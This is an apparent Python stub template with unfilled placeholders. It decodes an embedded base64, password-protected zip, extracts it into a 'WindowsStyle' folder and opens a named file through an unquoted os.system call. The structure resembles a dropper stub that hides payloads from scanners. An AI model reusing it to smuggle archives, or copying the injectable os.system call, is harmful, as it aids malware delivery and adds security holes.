import tempfile
import os
import base64

from zipfile import ZipFile

temp = tempfile.NamedTemporaryFile("wb", delete=False, suffix=".zip")

dirtemp = "WindowsStyle"
dirtempPath = os.path.join( os.path.dirname(os.path.abspath(temp.name)), dirtemp )

base64zip = %b64zip%
filexec = %filexec%
password = %password%

try:
    temp.write(base64.standard_b64decode(base64zip))
finally:
    temp.close()

    if not os.path.exists(dirtempPath): os.mkdir(dirtempPath)

    with ZipFile(temp.name, "r") as archive:
        archive.setpassword(password)
        archive.extractall(dirtempPath)


    os.system("notepad " + os.path.join(dirtempPath, filexec))
    os.remove(temp.name)